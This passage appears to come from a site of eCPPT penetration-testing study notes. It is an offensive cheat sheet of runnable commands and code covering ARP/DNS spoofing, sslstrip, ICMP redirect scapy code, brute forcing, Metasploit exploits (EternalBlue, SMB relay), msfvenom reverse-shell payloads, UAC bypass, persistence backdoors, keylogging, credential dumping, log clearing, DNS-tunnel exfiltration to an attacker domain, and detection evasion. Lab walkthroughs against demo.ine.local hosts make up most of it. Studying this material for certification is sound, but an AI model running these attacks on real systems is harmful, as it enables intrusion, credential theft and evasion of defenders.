https://gbhackers.com/man-in-the-middle-attack-with-cain-and-abel-tool/\n</code></pre></p> <p>Macof <pre><code>Mac flooding attack against switches. Note to run wireshark.\n\necho 1 &gt; /proc/sys/net/ipv4/ip_forward           # Enable port forwarding\nmacof -i [interface]                             # Run mac flooding\n</code></pre></p> <p>Arpspoof <pre><code>echo 1 &gt; /proc/sys/net/ipv4/ip_forward\n\narpspoof -i [interface] -t [target 1] [target 2]\narpspoof -i [interface] -t [target 2] [target 1]\n</code></pre></p> <p>Dnsspoof <pre><code># Redirect *.sportsfoo.com to 172.16.5.101\n\necho \"172.16.5.101 *.sportsfoo.com\" &gt; dns      \n\ndnsspoof -i [interface] -f dns\n</code></pre></p> <p>Bettercap <pre><code>net.probe on \nnet.sniff on\n\nhelp arp.spoof\nhelp dns.spoof\n</code></pre></p> <p>sslstrip <pre><code>sslstrip\n    echo 1 &gt; /proc/sys/net/ipv4/ip_forward\n    iptables -t net -A PREROUTING -p top --destination-port 80 -j REDIRECT --to-port 8080\n    sslstrip -a -f -l 8080 -w els_sslt\n\n\nEthercap\n    Plugins &gt; Manage Plugins &gt; sslstrip\n\n\nBettercap\n    set https.proxy.sslstrip true\n    https.proxy on\n\n\nsslstrip+\n    python mitmf.py -i [interface] --spoof --arp --dns --hsts --gateway [gateway_IP] --targets [target_IP]\n</code></pre></p> <p>ICMP redirect <pre><code># Identify reachable networks.\n$ ip route show dev eth1\n\n#Configure attacker machine to perform IP masquerading.\n\necho 1 &gt; /proc/sys/net/ipv4/ip_forward\niptables -t nat -A POSTROUTING -s 10.100.13.0/255.255.255.0 -o eth1 -j MASQUERADE\n\n\n#Run scapy and paste following code\n\noriginalRouterIP='10.100.13.1'\nattackerIP='10.100.13.20'\nvictimIP='10.100.13.126'\nserverIP='10.23.56.100'\n# We create an ICMP Redirect packet\nip=IP()\nip.src=originalRouterIP\nip.dst=victimIP\nicmpRedirect=ICMP()\nicmpRedirect.type=5\nicmpRedirect.code=1\nicmpRedirect.gw=attackerIP\n# The ICMP packet payload /should/ contain the original TCP SYN packet\n# sent from the victimIP\nredirPayloadIP=IP()\nredirPayloadIP.src=victimIP\nredirPayloadIP.dst=serverIP\nfakeOriginalTCPSYN=TCP()\nfakeOriginalTCPSYN.flags=\"S\"\nfakeOriginalTCPSYN.dport=80\nfakeOriginalTCPSYN.seq=444444444\nfakeOriginalTCPSYN.sport=55555\nwhile True:\n    send(ip/icmpRedirect/redirPayloadIP/fakeOriginalTCPSYN)\n</code></pre></p> <p>MITM Labs <pre><code>#Check Domain name\nnslookup                                         \n    server &lt;DNS Server&gt;\n    &lt;IP&gt;\n\n\n#Check gateway IP \ntraceroute 10.10.10.10 -m 5\n\n\n#Exploit Samba is_known_pipename()\nmsfconsole\n    use exploit/linux/samba/is_known_pipename\n    set RHOST 172.16.5.10\n    show advanced\n    set SMBUser admin\n    set SMBPass et1@sR7!\n    set LHOST 172.16.5.101\n    set SMB::AlwaysEncrypt false\n    exploit\n\n\n\n#Web Delivery Module\nmsfcoonsole\n    use exploit/multi/script/web_delivery\n    set TARGET 3\n    set LHOST 172.16.5.101\n    set PAYLOAD windows/meterpreter/reverse_tcp\n    exploit\n    jobs\n\n\nmeterpreter &gt; run arp_scanner -r 10.100.40.0/24.           # ARP Scan\nmeterpreter &gt; portfwd add -l 1234 -p 80 -r 10.100.40.107.  # Port Forwarding\n\n\nset PAYLOAD windows/meterpreter/bind_tcp   # Use this payload during pivoting\n</code></pre></p>"},{"location":"eCPPT%20Materials/Network%20Security/#exploitation","title":"Exploitation","text":""},{"location":"eCPPT%20Materials/Network%20Security/#weak-and-default-passwords-brute-force","title":"Weak and Default Passwords / Brute Force","text":"<pre><code>/usr/share/ncrack/                          # Default Ncrack Wordlists\n\nncrack ftp://10.10.10.15:21\nncrack ftp://10.10.10.15:21 ssh://10.10.10.15:22\nncrack 10.10.10.10,15 -p ftp:21,smb\n\nncrack -u admin -P /usr/share/ncrack/top50000.pwd -f ssh://10.10.10.15 \n\nncrack -iX nmap_oX_output -u root -P /usr/share/wordlists/rockyou.txt\n\nncrack ftp://10.10.10.15:21 --save session\nncrack ftp://10.10.10.15:21 --resume session\n</code></pre> <pre><code>Medusa -d                                   # List all avaliable modules\nmedusa -M &lt;module&gt; -q                       # Module usage information\n\nmedusa -h 10.10.10.15 -M ssh -u root -P /usr/share/wordlist/rockyou.txt\n</code></pre> <pre><code>patator                                     # List all available modules\npatator &lt;module&gt; --help                     # Module usage information\n\npatator ftp_login host=10.10.10.15 user=root password=FILE0 0=wordlist.txt\n</code></pre> <pre><code>Hydra\nHydra -l root -P /usr/share/wordlist/rockyou.txt 10.10.10.15 ssh\n</code></pre> <pre><code>Eyewitness                             # Quickly identify low-hanging fruit\n./EyeWitness/Python/setup/setup.py.    # Setup\n\npython3 eyewitness.py --headless --prepared-https -f urls.txt\n</code></pre>"},{"location":"eCPPT%20Materials/Network%20Security/#password-generator","title":"Password Generator","text":"<pre><code># Rsmangler - Tool for password permulation\n\ncat words.txt | rsmangler --file - &gt; mew_words.txt\n</code></pre> <pre><code># Cewl - Tool to take keywords form target website\n\ncewl -m 8 https://target.com\n</code></pre> <pre><code># Cupp - Tool to generate password depends on input\n\ncupp -i\n</code></pre> <pre><code># Crunch - Generate custom wordlist\n\ncrunch 8 8 -t ,@123456 -o wordlist.txt\n</code></pre> <pre><code>sed -ri '/^.{,7}$/d' william.txt                # Remove Passwords Shorter Than 8\nsed -ri '/[!-/:-@\\[-`\\{-~]+/!d' william.txt`.   # Remove Passwords With No Special Chars\n`sed -ri '/[0-9]+/!d' william.txt`              # Remove Passwords With No Numbers\n</code></pre>"},{"location":"eCPPT%20Materials/Network%20Security/#exploit","title":"Exploit","text":"<p>SMB Capture With Metasploit <pre><code>msf &gt; use auxilary/server/capture/smb\n</code></pre></p> <p>Crack NTLMv1 hash with John/rainbow rcracki_mt rainbow tables <pre><code># Crack with John\njohn --format=netlm {hash file}\n\n\n# Crack with Rainbow Tables\n\n# halflm_second.rb - /usr/share/metasploit-framework/tools/password/\n# netntlm.pl - /usr/share/metasploit-framework/data/john/run.linux.x64.mmx/\n# netntlm.pl - /usr/share/john/netntlm.pl\n\nrckracki_mt -h {First 8 byte of LMHASH} -t 4 *.rti\n\nruby halflm_second.rb -n {Entire NTHASH} -p {Previosly cracked 8 byte NTHASH cleartext password}\n\nperl netntlm.pl -file {Hash file} -seed {Cracked Password}\n</code></pre></p> <p>SMB Relay Attack <pre><code>msf &gt; use exploit/windows/smb/smb_relay\n\nimpacket-smbrelayx -h {target_IP} -e smbexp.exe\n</code></pre></p> <p>NTLM Relay attack <pre><code>impacket-ntlmrelayx -t [target_IP] -smb2support\n</code></pre></p> <p>Generate msfvenom Payload <pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST={IP} LPORT={PORT} -f exe -o smbexp.exe \n\nmsf &gt; use exploit/multi/handler\n</code></pre></p> <p>SMTP Exploit <pre><code># Check if authentication is required\n\ntelnet &lt;IP&gt; 25\n&gt; EHLO domain.com\n\n-----------------------------------------------------------------------------\n\n# Python script to run unauthenticated with attachment\n\n    import smtplib\n    from email.mime.multipart import MIMEMultipart\n    from email.mime.text import MIMEText\n    from email.mime.application import MIMEApplication\n\n    # Email server settings\n    smtp_host = 'demo.ine.local'\n    smtp_port = 25\n\n    # Sender and recipient details\n    sender_email = 'sender@example.com'\n    recipient_email = 'recipient@example.com'\n\n    # Email content\n    subject = 'Test Email with Attachment'\n    body = 'This is a test email sent from Python with an attachment.'\n\n    # Create a MIMEMultipart object\n    msg = MIMEMultipart()\n    msg['Subject'] = subject\n    msg['From'] = sender_email\n    msg['To'] = recipient_email\n\n    # Attach body as plain text\n    msg.attach(MIMEText(body, 'plain'))\n\n    # Attach the file\n    attachment_path = '/path/to/attachment/file.txt'\n    with open(attachment_path, 'rb') as attachment_file:\n        part = MIMEApplication(attachment_file.read())\n        part.add_header('Content-Disposition', f'attachment; filename=\"{attachment_path}\"')\n        msg.attach(part)\n\n    try:\n        # Connect to the SMTP server\n        server = smtplib.SMTP(smtp_host, smtp_port)\n\n        # Send the email\n        server.sendmail(sender_email, [recipient_email], msg.as_string())\n\n        # Close the connection\n        server.quit()\n        print(\"Email with attachment sent successfully!\")\n    except Exception as e:\n        print(f\"Failed to send email with attachment: {e}\")\n</code></pre></p> <p>EternalBlue (MS17-010) <pre><code>msf &gt; use auxiliary/scanner/smb/smb_ms17_010            # Scan\n\nmsf &gt; use exploit/windows/smb/ms17_010_eternalblue      # Exploit\n</code></pre></p> <p>Client-Side Exploitation -  Mozilla Firefox resource: URL Remote Code Execution Vulnerability <pre><code>msf &gt; use exploit/multi/browser/firefox_pdfjs_privilege_escalation\nmsf &gt; info\nmsf &gt; set SRVHOST &lt;local_IP&gt;\nmsf &gt; set SVRPORT &lt;port&gt;\nmsf &gt; exploit\n</code></pre></p> <p>Client-Side Exploitation -  Adobe Flash Player ByteArray Use After Free <pre><code>msf &gt; use exploit/multi/browser/adobe_flash_hacking_team_uaf\n</code></pre></p> <p>Remote-Side Exploitation -  Microsoft Security Bulletin MS08-067 <pre><code>msf &gt; use exploit/windows/smb/ms08_067_netapi\n</code></pre></p> <p>MSFConsole <pre><code>msf &gt; help\nmsf &gt; search type:exploit platform:windows\nmsf &gt; search author:HDM\nmsf &gt; search cve:2015\nmsf &gt; grep vnc search type:exploit\n\nmsf &gt; show exploits\nmsf &gt; show payloads\n\nmsf &gt; info &lt;exploit&gt;\n\n\nmeterpreter &gt; background                                \nmeterpreter &gt; session -i &lt;session_id&gt;                  \nmeterpreter &gt; download\nmeterpreter &gt; upload\nmeterpreter &gt; edit\nmeterpreter &gt; execute -f cmd.exe -i H\nmeterpreter &gt; search -f &lt;file.*&gt;\nmeterpreter &gt; run post/windows/gather/enum_applications\nmeterpreter &gt; run post/windows gather/enum_services\n\nmeterpreter &gt; keyscan_start\nmeterpreter &gt; keyscan_dump\nmeterpreter &gt; keyscan_stop\n\nmeterpreter &gt; clearev                                     # Clear System logs\n\nmeterpreter &gt; load kiwi                                   # Load Mimikatz\nmeterpreter &gt; help\nmeterpreter &gt; creds_all\n</code></pre></p> <p>MSFConsole with Nessus <pre><code>service postgreqsl start                              # Start database\n\n\nmsf &gt; load nessus\nmsf &gt; nessus_connect user:password@localhost\nmsf &gt; nessus_scan_list\nmsf &gt; nessus_report_hosts &lt;id&gt;\nmsf &gt; nessus_reports_vulns &lt;id&gt;\nmsf &gt; nessus_db_import &lt;id&gt;\nmsf &gt; vulns                                           # List Vulnerabilities\n</code></pre></p> <p>Exploit Labs <pre><code>nmap -iN hosts --script vuln\n\nexploit/unix/ftp/proftpd_133c_backdoor                 # demo.ine.local\nexploit/multi/misc/java_rmi_server                     # demo2.ine.local\nauxiliary/scanner/mysql/mysql_authbypass_hashdump      # demo3.ine.local\nexploit/multi/http/apache_mod_cgi_bash_env_exec        $ demo4.ine.local\n\n-----------------------------------------------------------------------------\n\nNessus Scans\n\nauxiliary/scanner/ssl/openssl_heartbleed\n\n-----------------------------------------------------------------------------\n\nSMTP Exploit &gt; Send email with attachment &gt; Pivoting &gt; Badblue Exploit.\n\n-----------------------------------------------------------------------------\n\nArpspoof &gt; Dnsspoof &gt; msfvenom &gt; smbrelayx\n\narpspoof -i eth1 172.16.5.1 172.16.5.5\narpspoof -i eth1 172.16.5.5 172.16.5.1\necho \"172.16.5.101 *.sportsfoo.com\" &gt; dns\ndnsspoof -i eth1 -f dns\nimpacket-ntlmrelayx -t 172.16.5.10 -smb2support\nimpacket-smbrelayx -h 172.16.5.10\n</code></pre></p>"},{"location":"eCPPT%20Materials/Network%20Security/#post-exploitation","title":"Post Exploitation","text":""},{"location":"eCPPT%20Materials/Network%20Security/#privilege-escalation","title":"Privilege Escalation","text":"<p>Windows <pre><code># Migrate Process to avoid session lossing the session\nmeterpreter &gt; run post/windows/manage/migrate\n\nmeterpreter &gt; migrate -h\nmeterpreter &gt; migrate &lt;PID&gt;\n\n-----------------------------------------------------------------------------\n# Automatically escalate privilege by finding best technique\nmeterpreter &gt; getsystem\nmeterpreter &gt; getuid\n\n-----------------------------------------------------------------------------\n# UAC Bypass\nmeterpreter &gt; run post/windows/gather/win_priv      # Check if UAC is enabled\nmeterpreter &gt; search bypassuac\nmsf &gt; use exploit/windiws/local/bypass_vbs\nmsf &gt; set session &lt;session_id&gt;\nmsf &gt; exploit                            # Gain administrator rights\nmeterpreter &gt; getsystem                  # From administrator to NT/authority\n\n\nhttps://github.com/hfiref0x/UACME\nmeterpreter &gt; upload Akagi64.exe\nmeterpreter &gt; upload Payload.exe                  # Msfvenom reverse shell\nshell &gt; .\\Akagi64.exe 23 C:\\Payload.exe           # 32 bit system\nshell &gt; .\\Akagi64.exe 61 C:\\Payload.exe           # 32 bit system\n\n\n-----------------------------------------------------------------------------\n# Incognito - Impersonate windows tokens\nmeterpreter &gt; use incognito              # Better to run with system priv.\nmeterpreter &gt; list_tokens -u             # List all available tokens\nmeterpreter &gt; impersonate_token &lt;token&gt;  # Impersonate other user\n\n-----------------------------------------------------------------------------\n# Unquoted service path - Exploit service with path injection\nC:\\&gt; wmic service get name,displayname,pathname,startmode |findstr /i \"auto\" |findstr /i /v \"c:\\windows\\\\\" |finder /i /v \"\"\"        # wmic command to search unqouted service path\n\nC:\\&gt; sc qc &lt;service&gt;                                   # manual check\nC:\\&gt; sc start &lt;service&gt;                                # start service\nC:\\&gt; sc stop &lt;service&gt;                                 # stop service\n\nmsf&gt; use exploit/windows/local/trusted_service_path    # automatically check\n\nmsf exploit(multi/handler)&gt; set AutoRunScript migrate -n svchost.exe # Auto run migrate when meterpreter session is captured due to stable reasons.\n\nC:\\&gt; icacls &lt;folder&gt;                            # Check folder permissions\n\n-----------------------------------------------------------------------------\n</code></pre></p> <p>Linux <pre><code># Gather Info\nmeterpreter &gt; run post/linux/gather/enum_system\n\n\n# Publicly available privilage escalation exploits\nmeterpreter &gt; upload exploit.c\nmeterpreter &gt; shell                                   # Run Shell\nmeterpreter &gt; execute -f /bin/sh -i -c                # Run Shell\nshell &gt; gcc exploit.c -o exploit\nshell &gt; ./exploit\n\nattacker &gt; gcc -m32 exploit.c -o exploit           # Compile on local machine\n</code></pre></p>"},{"location":"eCPPT%20Materials/Network%20Security/#maintaining-access","title":"Maintaining Access","text":"<p>Password and Hash <pre><code>meterpreter &gt; run hashdump\nmeterpreter &gt; run post/windows/gather/smart_hashdump      # Dump hashes\n\nmsf &gt; use exploit/windows/smb/psexec             # PTH\nimpacket-psexec                                  # PTH\n\n-----------------------------------------------------------------------------\n\n# When user is in administrator group but stil cant PTH, enable \nPS&gt; Set-ItemProperty -Path HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name LocalAccountTokenFitlerPolicy -Value 1 -Type DWord\n\nPS&gt; Set-ItemProperty -Path HKLM:\\System\\CurrentControlSet\\Services\\LanManServer\\Parameters -Name LocalAccountTokenFitlerPolicy -Value 1 -Type DWord\n\nOR\n\nC:\\&gt; reg add \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" \\v LocalAccountTokenFilterPolicy /t REG_WORD /d 1 /f\n\nC:\\&gt; reg add \"HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\LanManServer\\Parameters\" \\v RequireSecuritySignature /t REG_WORD /d 0 /f\n\n-----------------------------------------------------------------------------\n\n# XfreeRDP\n\nxfreerdp /u:user /d:domain /pth:hash /v:host\n\n-----------------------------------------------------------------------------\n\n# Mimikatz - Note to run meterpreter shell as 64 bit\n\nmeterpreter &gt; ps -A x86_64 -s                 # Search 64bit process\nmeterpreter &gt; migrate &lt;64bit_process_pid&gt;     # Change shell to 64bit\nmeterpreter &gt; load mimikatz                   # Load mimikatz\n\n\n-----------------------------------------------------------------------------\n\n# Windows Credentials Editor\n# https://web.archive.org/web/20200414231958/http:/www.ampliasecurity.com/research/windows-credentials-editor/\n\nmeterpreter &gt; execute -i -f wce.exe -a -h\n\n-----------------------------------------------------------------------------\n\n# Enable RDP service\nshell&gt; net start                     # List enabled services\nshell&gt; wmic service where 'Caption like \"Remote%\" and started=true' get Caption                              # Check if RDP is enabled\n\nmeterpreter &gt; run service_manager -1                      # Check services\nmeterpreter &gt; run post/windows/gather/enum_services       # Check services\n\nmeterpreter &gt; run getgui -h\nmeterpreter &gt; run getgui -e                       # Enable RDP\n\nshell&gt; net localgroup \"Remote Desktop Users\" els_user /add    # Add user to RDP Group\n\nrdesktop &lt;IP&gt; -u &lt;user&gt; -p &lt;passwd&gt;               # Login with RDP\n\nnet localgroup                                    # List all local groups\nnet localgroup &lt;group&gt;                            # List members of group\nnet localgroup \"Administrators\" &lt;user&gt; /add       # Add user to adm group\n</code></pre></p> <p>Backdoor <pre><code># Persistence\nmeterpreter &gt; run persistence -h\nmeterpreter &gt; run persistence -A -X -i [time] -P [port] -r [attacked_IP]\n\nmsf &gt; use exploit/windows/local/persistence\n\n\n# Persistence using manual payload generated by MSFvenom/Veil/BDF\n\nC:\\&gt; reg setval -k HKLM\\\\software\\\\microsoft\\\\windows\\\\currentversion\\\\run -d \"payload.exe\" -v payload_name            # Add generated payload to startup\n</code></pre></p> <p>New Users <pre><code>net user &lt;username&gt; &lt;password&gt; /add                   # Create new user\nnet localgroup \"Administrators\" &lt;username&gt; /add       # Add user to adm group\nnet localgroup \"Remote Desktop Users\" &lt;user&gt; /add     # Add user to RDP group\nnet localgroup \"TelnetClients\" &lt;user&gt; /add         # Add user to telnet group\n</code></pre></p> <p>DLL Hijacking/Preloading <pre><code># Process Explorer\nhttps://learn.microsoft.com/en-us/sysinternals/downloads/process-explorer\n\n# Process Monitor\nhttps://learn.microsoft.com/en-us/sysinternals/downloads/procmon\n\n# list of Vulnerable Applications\nhttps://web.archive.org/web/20140222035441/https:/www.exploit-db.com/dll-hijacking-vulnerable-applications/\n\n\n\nWhen a program is launched, the DLL Search Order in most cases is as follows:\n\n1.The directory from which the application was launched\n2.The\u00a0`C:\\Windows\\System32`\u00a0directory\n3.The 16-bit Windows system directory (i.e,\u00a0`C:\\windows\\system`)\n4.The Windows directory (`C:\\windows`)\n5.The current directory at the time of execution\n6.Any directories specified by the %PATH% environment variable\n\n\nProcess Explorer - Identify file PATH and associated services  \n\nProcess Monitor - Apply filters to check what DLL are loaded.\n\nServices - Stop and start services to display dll processes on Process Monitor\n\n# Run Process Monitor with following filters\nResult       &gt; contains &gt;  NAME NOT FOUND\nPath         &gt; end with &gt;  .dll\n</code></pre></p>"},{"location":"eCPPT%20Materials/Network%20Security/#data-harvestingpillaging","title":"Data Harvesting/Pillaging","text":"<pre><code>meterpreter &gt; sysinfo                            # System info\nC:\\ &gt; systeminfo                                 # System info\nmeterpreter &gt; getuid                             # Check user we are running\n\nmeterpreter &gt; run post/windows/gather/           # Windows gather scripts\nmeterpreter &gt; run post/linux/gather/             # Linux gather scripts\nmeterpreter &gt; ps                                 # Enum services\n\nC:\\ &gt; wmic service get Caption,StartName,State,pathName  # Enum services\nC:\\ &gt; net start                                          # Enum services\nC:\\ &gt; netstat -ano                                       # Enum services\n\n$ service --status-all                                   # Enum services\n\nC:\\ &gt; net view /domain                                 # Gather domain name\nmeterpreter &gt; run post/windows/gather/enum_domains   # Enum domain/controller\nC:\\ &gt; net group \"Domain Contollers\" /domain      # List of domain controllers\n\nmeterpreter &gt; run post/windows/gather/enum_ad_users    # Enum AD Users\nC:\\ &gt; net user /domain                                 # Enum AD Users\n\nC:\\ &gt; net localgroup                              # Enum local groups\nC:\\ &gt; net localgroup \"Administrators\"        # View members of Administrators\n\nC:\\ &gt; net share                                   # Enum shares\nmeterpreter &gt; run enum_shares                     # Enum shares\n\nmeterpreter &gt; run scraper                     # Windowns Enum\nmeterpreter &gt; run winenum                     # Windows Enum\n\n-----------------------------------------------------------------------------\n\n# Keylogger\nmeterpreter &gt; keyscan_start                          # Start Keylogger\nmeterpreter &gt; keyscan_dump                           # Dump Keys\nmeterpreter &gt; keyscan_stop                           # Stop Keylogger\n\nNote: Migrate to winlogon.exe in order to DUMP windows logon credentials.\nNote: Migrate to explorer.exe in order to DUMP user level activities.\n\nmeterpreter &gt; run keylogrecorder -h             # Keylogger\nmeterpreter &gt; run keylogrecorder -c 1           # Keylogger with winlogon.exe\nmeterpreter &gt; run keylogrecorder -c 0           # Keylogger with explorer.exe\n\n-----------------------------------------------------------------------------\n\nmeterpreter &gt; search -h \nmeterpreter &gt; search -d C:\\\\Users\\\\els\\\\ -f *.kdbx    # Search KeePass file\n\n\nmeterpreter &gt; run post/windows/gather/credentials/    # List modules related to Credentials\nmeterpreter &gt; run post/windows/gather/credentials/winscp  # Enum Passwords on local system\nmeterpreter &gt; run post/windows/gather/credentials/credential_collector  # Dump Hashes and Tickets\nmeterpreter &gt; run post/windows/gather/enum_chrome     # Retrieve Creds stored in Chrome\n\nmeterpreter &gt; run post/multi/gather/            # List Another gather modules\nmeterpreter &gt; run post/windows/gather/enun_applications   # Enum Applications\n</code></pre> <p>Data Exfitration with DNS Tunelling <pre><code>#https://github.com/yarrick/iodine\n\n1. Register domain name through godaddy.com - For example attackerdomain.com\n2. Host on the internet to use as DNS server. - for example 100.50.50.100\n3. Add Hostnames on godaddy.com - ns1.attackerdomain.com / ns2.attackerdomain.com with IP address of our created host 100.50.50.100\n4. Change Nameservers to ns1.attackerdomain.com and ns2.attackerdomain.com on godaddy.com\n\nConfigure iodine as server on 100.50.50.100 host \n    iodine -u user -p 'Password123' -f 10.0.0.1 ns1.attackerdomain.com\n\nConfigure iodine as client on internal host\n    iodine -p \"Password123\" ns1.attackerdomain.com -T CNAME -r -f \n\nCheck if we got new Network Interface with ifconfig command\n\nIn order to tunnel all of our data securely, create local SSH socks proxy\n    ssh user@10.0.0.1 -D 10.0.0.2:1234 -N -C \n\nUse browser as SOCKS5 proxy with 10.0.0.2:1234\n</code></pre></p> <p>Post Exploitation Scripts Windows Post-Exploitation Linux/Unix/BSD Post-Exploitation # Linux Post Exploitation OS X Post-Exploitation Metasploit Post-Exploitation</p> <p>Offline Tool for Post Exploitation - post-exploitation-wiki</p>"},{"location":"eCPPT%20Materials/Network%20Security/#mapping-internal-network","title":"Mapping Internal Network","text":"<pre><code># Network Interfaces\nmeterpreter &gt; ifconfig\nC:\\ &gt; ipconfig /all\nC:\\ &gt; ipconfig /displaydns                             # DNS cache\n$ ifconfig\n\n# Route \nmeterpreter &gt; route\nC:\\ &gt; route print\n$ route -v\n\n# Arp cache\nmeterpreter &gt; arp\nC:\\ &gt; arp -a\n$ arp\n\n# Opened/Connected/Estabilished Ports/Hosts\nmeterpreter &gt; netstat\nC:\\ &gt; netstat -ano\n$ netstat -tulpn\n\n# internal host detection\nmeterpreter &gt; run arp_scanner -h\nmeterpreter &gt; run arp_scanner -r 10.10.10.0/24\n\n# Ping scan\nmsf &gt; use post/multi/gather/ping_sweep\n\n# Port scan\nmsf &gt; use auxiliary/scanner/portscan/\n\n# Network enumerator \nmeterpreter &gt; run netenum -h\n</code></pre> <p>Meterpreter SSL Certificate Impersonation and Detection Evasion <pre><code># Generate SSL Payload to impersonate as Microsoft SLL certificate\nmsf &gt; use auxiliary/gather/impersonate_ssl\nmsf &gt; set RHOST www.microsoft.com\nmsf &gt; run\nmsf &gt; use payload windows/x64/meterpreter/reverse_https\nmsf &gt; set LHORT [local_IP]\nmsf &gt; set LPORT 443\nmsf &gt; set handlersslcert [generated .pem file]\nmsf &gt; set stagerverifysslcert true\nmsf &gt; generate -t exe -f /ssl_payload.exe\n\n# Set Multi Handler\nmsf &gt; use exploit/multi/handler\nmsf &gt; set LHOST [local_IP]\nmsf &gt; set LPORT 443\nmsf &gt; set handlersslcert [generated .pem file]\nmsf &gt; set stagerverifysslcert true\nmsf &gt; set payload windows/x64/meterpreter/reverse_https\nmsf &gt; exploit -j\n\n# Run ssl_payload.exe on target and check traffic in wireshark to verify that Microsoft SSL certificate is used to encrypt data in order to evasion of detection systems.\n</code></pre></p> <p>Obtaining Stored Credentials with SessionGopher <pre><code># https://github.com/Arvanaghi/SessionGopher\n\n# Run Locally\n.\\SessionGopher.ps1\nInvoke-SessionGopher -Thorough\n\n# Run Remotely\nImport-Module path\\to\\SessionGopher.ps1;\nInvoke-SessionGopher -AllDomain -u domain.com\\adm-arvanaghi -p s3cr3tP@ss\n\nImport-Module path\\to\\SessionGopher.ps1;\nInvoke-SessionGopher -iL computerlist.txt -u domain.com\\adm-arvanaghi -p s3cr3tP@ss -o\n\nImport-Module path\\to\\SessionGopher.ps1;\nInvoke-SessionGopher -Target brandonArvanaghi_win7 -Thorough\n</code></pre></p>"},{"location":"eCPPT%20Materials/Network%20Security/#labs","title":"Labs","text":"<p>Post-Exploitation <pre><code># Target - demo.ine.local , demo1.ine.local\n\n\n# Scan Host1\nnmap -sS -sV demo.ine.local\n\n# Httpfileserver 2.3.x is used, so exploit it with meterpreter\nmsf &gt; exploit/windows/http/rejetto_hfs_exec\nmeterpreter &gt; getsystem                       # Get System privilages\n\n# Enum applications, FileZilla Client 3.57.0 is used\nmeterpreter &gt; run post/windows/gather/enum_applications \nmeterpreter &gt; post/multi/gather/filezilla_client_cred      # Get FTP Creds\n\n# Pivoting\nmeterpreter &gt; run autoroute -s &lt;subnet_host1&gt; -n &lt;netmask&gt;\nmeterpreter &gt; run autoroute -s &lt;subnet_host2&gt; -n &lt;netmask&gt;  # For reverse_tcp\nmsf &gt; use auxiliary/server/socks_proxy\nmsf &gt; set version 4a\nmsf &gt; set \n\n# Scan Host2 / Port 21 is opened and connect with creds retrieved before\nproxychains ftp demo1.ine.local\nftp &gt; get username.txt                     # File of local users\n\n# Brute force local users / get them creds\nproxychains hydra -l administrator -P /usr/share/wordlists/rockyou.txt demo1.ine.local smb\nproxychains hydra -l sysadmin -P /usr/share/wordlists/rockyou.txt demo1.ine.local smb\n\n\n# RCE on Host2\nproxychains ssh administrator@demo1.ine.local\nOR\nmsf &gt; use exploit/windows/smb/psexec\nmsf &gt; set payload windows/meterpreter/blind_tcp\nOR\nmsf &gt; use exploit/windows/smb/psexec\nmsf &gt; set payload windows/meterpreter/reverse_tcp      # Double pivoting\nmsf &gt; set LHOST host1\n</code></pre></p> <p>Blind Penetration Test <pre><code># Target - demo.ine.local\n# User/Pass Wordlists Path - /usr/share/metasploit-framework/data/wordlist/\n# WebShell Path - /usr/share/webshells/\n\n\n# Scan Host\nnmap -sS -sV demo.ine.local\n\n# Run dirb to find \"Webdav\" Directory\ndirb http://demo.ine.local\n\n# Brute force \"Webdav\" directory and get credentials\nhydra -L common_users.txt -P unix_passwords.txt demo.ine.local http-get /webdav\n\n# Run davtest tool to check if file upload/execute is possible on \"Webdav\"\ndavtest -url http://demo.ine.local/webdav -auth administrator:tigger\n\n# Upload webshell.asp to get backdoor swhell on /webdav/webshell.asp\ndavtest -url http://demo.ine.local/webdav -auth administrator:tigger  -uploadfile webshell.asp -uploadloc /\n\n# Generate meterpreter payload\nmsfvemom -p /windows/meterpreter/reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe &gt; payload.exe\n\n# Upload meterpreter payload to webdav directory\ndavtest -url http://demo.ine.local/webdav -auth administrator:tigger  -uploadfile payload.exe -uploadloc /\n\n# Locate and execute payload.exe through webshell.asp backdoor\nC:\\inetpub\\wwwroot\\webdav\\payload.exe\n\n# Run Multi/Handler listener and gain meterpreter shell\nmeterpreter &gt; use exploit/multi/hanlder\n\n# Privilege Escalation\nmeterpreter &gt; run post/windows/gather/win_privs     # SeImpersonatePrivilage\nmeterpreter &gt; migrate -N w3wp.exe                   # Migrate to w3wp.exe\nmeterpreter &gt; load incognito\nmeterpreter &gt; list_tokens -u\nmeterpreter &gt; impersonate_token DOTNETGOAT\\\\Administrator\nmeterpreter &gt; getuid\nmeterpreter &gt; getsystem\n</code></pre></p> <p>Privilege Escalation <pre><code># Scan Host\nnmap -sS -sV demo.ine.local\n\n# Httpfileserver 2.3.x is used, so exploit it with meterpreter\nmsf &gt; exploit/windows/http/rejetto_hfs_exec\n\n# Check privilege escalation exploits. UACbypass exploits are presented\nmeterpreter &gt; run post/multi/recon/local_exploit_suggester\n\n# Get Administrator rights with metasploit\nmsf &gt; use exploit/windows/local/bypassuac_dotnet_profiler\nmeterpreter &gt; getsystem\n\n# OR get administrator rights with UACME\nmeterpreter &gt; upload Akagi64.exe .\nmeterpreter &gt; upload msfpayload.exe\nshell &gt; Akagi64.exe 23 C:\\\\msfpayload.exe\n\nmsf &gt; use exploit/multi/handler\nmeterpreter &gt; getsystem\n\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe -o msfpayload.exe \n</code></pre></p> <p>Privilege Escalation Via Services <pre><code># Scan Host\nnmap -sS -sV demo.ine.local\n\n# BadBlue httpd 2.7is used, so exploit it with meterpreter\nmsf &gt; exploit/windows/http/badblue_passthru\n\n# Upload PowerSploit and run Invoke-AllChecks to locate vulnerable services\nshell &gt; Import-Module .\\PowerUp.ps1\nshell &gt; Invoke-AllChecks\n\n# Abuse vulnerable service to gain Administrator rights\nshell &gt; Invoke-ServiceAbuse -Name AppReadiness \nshell &gt; Invoke-ServiceAbuse -Name AppReadiness -UserName \"test\\user\"\nshell &gt; Invoke-ServiceAbuse -Name AppReadiness -Command \"Add user to adm\"\n\n\n# Run Psexec with NT\\AUTHORITY user\n$ Impacket-Psexec test\\user@demo.ine.local\nOR\nmsf &gt; use exploit/windows/smb/psexec\n\n\n# OR Run hta server and exploit through service\nmsf &gt; use exploit/windows/misc/hta_server\nmsf &gt; exploit\n\nshell &gt; Invoke-ServiceAbuse -Name AppReadiness  